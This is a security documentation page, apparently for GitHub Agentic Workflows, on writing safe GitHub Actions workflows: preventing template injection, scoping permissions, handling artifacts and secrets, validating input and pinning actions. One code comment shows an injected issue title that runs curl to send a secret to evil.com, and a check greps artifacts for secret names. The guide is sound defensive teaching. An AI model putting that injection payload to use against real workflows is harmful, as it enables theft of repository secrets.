---
title: Secure Workflow Authoring Guide
description: Comprehensive guide for writing secure GitHub Agentic Workflows, covering template injection prevention, permission scoping, and security best practices.
sidebar:
  order: 4
---

This guide provides comprehensive security patterns and best practices for authoring GitHub Agentic Workflows. Following these guidelines helps prevent common vulnerabilities and ensures your workflows operate safely within GitHub Actions.

## Template Injection Prevention

Template injection is the most critical security risk in GitHub Actions workflows. It occurs when untrusted user input flows into GitHub Actions expressions (`${{ }}`), allowing attackers to inject malicious code.

### Understanding the Risk

GitHub Actions expressions are evaluated before workflow execution. If untrusted data (issue titles, PR bodies, comments) is used directly in these expressions, attackers can inject arbitrary code to:
- Execute malicious commands
- Access secrets and tokens
- Exfiltrate sensitive data
- Modify repository contents

### ❌ DON'T: Interpolate User Input in Expressions

**Vulnerable Pattern:**
```yaml
# UNSAFE: Direct use of untrusted input
on:
  issues:
    types: [opened]

jobs:
  process:
    steps:
      - run: echo "${{ github.event.issue.title }}"
        # Attacker can inject: "; curl evil.com/?secret=$SECRET; echo "
```

**Why it's vulnerable:** The issue title is directly interpolated into the expression. An attacker can craft a malicious title that breaks out of the string context and executes arbitrary commands.

### ✅ DO: Use Environment Variables for User Input

**Safe Pattern:**
```yaml
# SECURE: Pass untrusted data through environment variables
on:
  issues:
    types: [opened]

jobs:
  process:
    steps:
      - name: Process issue title
        env:
          ISSUE_TITLE: ${{ github.event.issue.title }}
        run: echo "$ISSUE_TITLE"
```

**Why it's secure:** The expression is evaluated in a controlled context (environment variable assignment). The shell receives the value as data, not executable code.

### Safe and Unsafe Context Variables

**Always safe to use in expressions** (controlled by GitHub):
- `github.actor`
- `github.repository`
- `github.run_id`
- `github.run_number`
- `github.sha`
- `github.event.issue.number`
- `github.event.pull_request.number`

**Never safe in expressions** (can contain user input):
- `github.event.issue.title` ❌
- `github.event.issue.body` ❌
- `github.event.comment.body` ❌
- `github.event.pull_request.title` ❌
- `github.event.pull_request.body` ❌
- `github.event.discussion.title` ❌
- `github.event.discussion.body` ❌
- `github.head_ref` ❌ (can be controlled by PR authors)
- `github.event.head_commit.message` ❌
- `steps.*.outputs.*` ⚠️ (depends on output source)

### Sanitized Context (gh-aw specific)

GitHub Agentic Workflows provides sanitized context for safe use:

```yaml
# SECURE: Use sanitized context output
prompt: |
  Analyze this content: "${{ needs.activation.outputs.text }}"
```

The `needs.activation.outputs.text` output is automatically sanitized:
- @mentions neutralized (`` `@user` ``)
- Bot triggers protected (`` `fixes #123` ``)
- XML tags converted to safe format
- Only HTTPS URIs from trusted domains
- Content limits enforced (0.5MB, 65k lines)
- Control characters removed

### Template Injection in Other Contexts

**In run-name:**
```yaml
# ❌ VULNERABLE
run-name: "Processing ${{ github.event.issue.title }}"

# ✅ SECURE
run-name: "Processing issue #${{ github.event.issue.number }}"
```

**In conditional expressions:**
```yaml
# ❌ VULNERABLE
if: github.event.comment.body == 'approved'

# ✅ SECURE
steps:
  - name: Check approval
    env:
      COMMENT_BODY: ${{ github.event.comment.body }}
    run: |
      if [ "$COMMENT_BODY" = "approved" ]; then
        echo "Approved"
      fi
```

## Permission Scoping

Always follow the principle of least privilege. Grant only the minimum permissions required for the workflow to function.

### Default Permissions

By default, GitHub Agentic Workflows use read-only permissions:

```yaml
# Default (if not specified)
permissions:
  contents: read
  actions: read
```

### ❌ DON'T: Use Overly Broad Permissions

```yaml
# DANGEROUS: Gives all permissions
permissions: write-all

# RISKY: More permissions than needed
permissions:
  contents: write
  issues: write
  pull-requests: write
  packages: write
```

### ✅ DO: Use Minimal Required Permissions

```yaml
# SECURE: Only what's needed
permissions:
  contents: read
  issues: write  # Only if creating/updating issues

safe-outputs:
  create-issue:  # Separate job with validated operations
```

### Permission Reference Table

| Permission | Read Access | Write Access | Use Case |
|------------|-------------|--------------|----------|
| `contents` | Read code | Push code | Repository access |
| `issues` | Read issues | Create/edit issues | Issue management |
| `pull-requests` | Read PRs | Create/edit PRs | PR management |
| `actions` | Read runs | Cancel runs | Workflow management |
| `checks` | Read checks | Create checks | Status checks |
| `deployments` | Read deployments | Create deployments | Deployment management |
| `discussions` | Read discussions | Create discussions | Discussion management |
| `packages` | Download | Publish | Package management |
| `statuses` | Read statuses | Create statuses | Commit statuses |

### Job-Level Permissions

Use job-level permissions for different privilege levels:

```yaml
permissions:
  contents: read  # Default for all jobs

jobs:
  analyze:
    # Uses default read-only permissions
    steps:
      - run: npm test
  
  deploy:
    permissions:
      contents: read
      deployments: write  # Only for deploy job
    steps:
      - run: npm run deploy
```

## Expression Best Practices

### Avoiding Undefined Property References

Always check for property existence before accessing nested properties:

❌ **Unsafe:**
```yaml
steps:
  - run: echo "${{ steps.build.outputs.result }}"
    # Fails if 'build' step doesn't exist or has no outputs
```

✅ **Safe:**
```yaml
steps:
  - id: build
    run: echo "result=success" >> $GITHUB_OUTPUT
  
  - if: steps.build.outputs.result
    run: echo "${{ steps.build.outputs.result }}"
```

### Job Dependency Patterns

Declare job dependencies explicitly:

```yaml
jobs:
  build:
    outputs:
      version: ${{ steps.set-version.outputs.version }}
    steps:
      - id: set-version
        run: echo "version=1.0.0" >> $GITHUB_OUTPUT
  
  deploy:
    needs: build  # Explicit dependency
    steps:
      - run: echo "Deploying ${{ needs.build.outputs.version }}"
```

### Output Declaration Patterns

Always declare outputs before using them:

```yaml
jobs:
  prepare:
    outputs:
      # Declare all outputs upfront
      config: ${{ steps.load-config.outputs.config }}
      version: ${{ steps.get-version.outputs.version }}
    steps:
      - id: load-config
        run: echo "config={}" >> $GITHUB_OUTPUT
      - id: get-version
        run: echo "version=1.0.0" >> $GITHUB_OUTPUT
```

## Safe Artifact Handling

### Pre-Upload Validation

Always validate artifacts before upload to prevent secret leakage:

```yaml
steps:
  - name: Validate no secrets in artifacts
    run: |
      # Check for common secret patterns
      ! grep -r "SECRET\|TOKEN\|PASSWORD\|API_KEY" dist/ || {
        echo "Error: Potential secrets found in artifacts"
        exit 1
      }
  
  - name: Upload artifact
    uses: actions/upload-artifact@v4
    with:
      name: build-output
      path: dist/
```

### Excluding Sensitive Files

Use exclusion patterns to prevent sensitive files from being uploaded:

```yaml
- uses: actions/upload-artifact@v4
  with:
    name: build-output
    path: dist/**
    # Exclude sensitive patterns
    exclude: |
      **/.env*
      **/*.key
      **/*.pem
      **/secrets.json
      **/.git/**
```

### Retention Policies

Set appropriate retention periods for artifacts:

```yaml
- uses: actions/upload-artifact@v4
  with:
    name: build-output
    path: dist/
    retention-days: 1  # Short retention for sensitive data
```

For non-sensitive data, the default retention (90 days) is acceptable:

```yaml
- uses: actions/upload-artifact@v4
  with:
    name: test-reports
    path: reports/
    # Uses default retention (90 days)
```

## Input Validation Requirements

Always validate inputs before use, especially when they'll be used in shell commands or file operations.

### Validating Numeric Inputs

```bash
# Validate numeric input
if ! [[ "$INPUT_NUMBER" =~ ^[0-9]+$ ]]; then
  echo "Error: Invalid number format"
  exit 1
fi
```

### Validating String Patterns

```bash
# Validate alphanumeric with limited special characters
if ! [[ "$INPUT_NAME" =~ ^[a-zA-Z0-9._-]+$ ]]; then
  echo "Error: Invalid name format"
  exit 1
fi
```

### Allowlist Validation

```bash
# Validate against allowlist
case "$INPUT_TYPE" in
  bug|feature|docs|refactor)
    echo "Valid type: $INPUT_TYPE"
    ;;
  *)
    echo "Error: Invalid type. Must be bug, feature, docs, or refactor"
    exit 1
    ;;
esac
```

### Path Validation

```bash
# Prevent directory traversal
if [[ "$FILE_PATH" =~ \.\. ]]; then
  echo "Error: Path traversal detected"
  exit 1
fi

# Validate file extension
if [[ "$FILE_PATH" != *.md ]]; then
  echo "Error: Only .md files allowed"
  exit 1
fi
```

## Secret Handling Guidelines

### Never Hardcode Secrets

❌ **Never do this:**
```yaml
steps:
  - run: curl -H "X-API-Key: sk-1234567890abcdef" api.example.com
```

✅ **Always use GitHub Secrets:**
```yaml
steps:
  - name: API Call
    env:
      API_KEY: ${{ secrets.API_KEY }}
    run: curl -H "X-API-Key: $API_KEY" api.example.com
```

### Avoid Logging Secrets

❌ **Don't log environment variables:**
```yaml
- run: |
    echo "Token: $DEPLOY_TOKEN"  # This will appear in logs!
    env
```

✅ **Use secrets safely:**
```yaml
- env:
    DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
  run: |
    # Use token without logging it
    curl -H "Authorization: Bearer $DEPLOY_TOKEN" api.example.com
```

### Masking Outputs

If you must output sensitive data, use masking:

```yaml
- name: Generate token
  id: token
  run: |
    TOKEN=$(generate-token)
    echo "::add-mask::$TOKEN"
    echo "token=$TOKEN" >> $GITHUB_OUTPUT
```

## Shell Script Best Practices

### Always Quote Variables

❌ **Unquoted (vulnerable to word splitting and globbing):**
```bash
FILES=$(ls *.txt)
for file in $FILES; do
  echo $file
done
```

✅ **Properly quoted:**
```bash
while IFS= read -r file; do
  echo "$file"
done < <(find . -name "*.txt")
```

### Enable Strict Mode

Always use strict mode for shell scripts:

```yaml
steps:
  - name: Secure script
    run: |
      set -euo pipefail  # Exit on error, undefined vars, pipe failures
      
      # Your script here
```

Explanation:
- `set -e`: Exit immediately if any command fails
- `set -u`: Exit if undefined variables are used
- `set -o pipefail`: Return exit code of last failed command in pipeline

### Use Modern Bash Constructs

✅ **Use `[[ ]]` for conditionals:**
```bash
if [[ "$VAR" == "value" ]]; then
  echo "Match"
fi
```

✅ **Use `$()` for command substitution:**
```bash
RESULT=$(command arg1 arg2)
```

❌ **Avoid backticks:**
```bash
RESULT=`command arg1 arg2`  # Old style, harder to nest
```

## Supply Chain Security

### Pin Actions to SHA Commits

❌ **Mutable references (tags can be moved):**
```yaml
- uses: actions/checkout@v4
- uses: actions/setup-node@main
```

✅ **Immutable SHA references:**
```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
- uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2
```

**Why:** SHA commits are immutable and prevent supply chain attacks via tag manipulation.

### Finding SHA for Actions

```bash
# Method 1: Using git ls-remote
git ls-remote https://github.com/actions/checkout v4.1.1

# Method 2: Using GitHub API
curl -s https://api.github.com/repos/actions/checkout/git/refs/tags/v4.1.1 | jq -r '.object.sha'

# Method 3: Visit the GitHub repository and copy SHA from tag page
```

### Update Pinned Actions Regularly

Set up Dependabot to automatically update pinned actions:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

## Security Checklist

Use this checklist when creating or reviewing workflows:

### Template Injection
- [ ] No untrusted input in `${{ }}` expressions
- [ ] Untrusted data passed via environment variables
- [ ] Safe context variables used where possible
- [ ] Sanitized context used for gh-aw workflows

### Permissions
- [ ] Minimal permissions specified
- [ ] No `write-all` permissions
- [ ] Job-level permissions for different privilege levels
- [ ] Fork PR handling configured appropriately

### Shell Scripts
- [ ] All variables quoted: `"$VAR"`
- [ ] Strict mode enabled: `set -euo pipefail`
- [ ] Input validation implemented
- [ ] Modern bash constructs used (`[[ ]]`, `$()`)

### Artifacts
- [ ] Pre-upload validation for secrets
- [ ] Sensitive files excluded
- [ ] Appropriate retention period set

### Supply Chain
- [ ] All actions pinned to SHA commits
- [ ] Version comments added to pinned actions
- [ ] Regular update process in place
- [ ] Dependabot configured for automatic updates

### Secrets
- [ ] No hardcoded secrets
- [ ] Secrets passed via environment variables
- [ ] No secrets logged to output
- [ ] Sensitive outputs masked when necessary

## Additional Resources

### Official Documentation
- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Security Best Practices for Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)

### Security Tools
- [actionlint](https://github.com/rhysd/actionlint) - Workflow linter
- [zizmor](https://github.com/woodruffw/zizmor) - Security scanner
- [shellcheck](https://www.shellcheck.net/) - Shell script analyzer

### Related Guides
- [Security Best Practices](/guides/security/)
- [Validation Rules Reference](/reference/validation-rules/)
- [CI Validation Setup](/guides/ci-validation-setup/)

## Examples

See [Workflow Templates](https://github.com/githubnext/gh-aw/tree/main/.github/workflow-templates) for secure examples:
- `slash-command.md` - Secure slash command pattern
- `safe-pr-handler.md` - Secure PR handling pattern
- `artifact-upload.md` - Secure artifact upload pattern
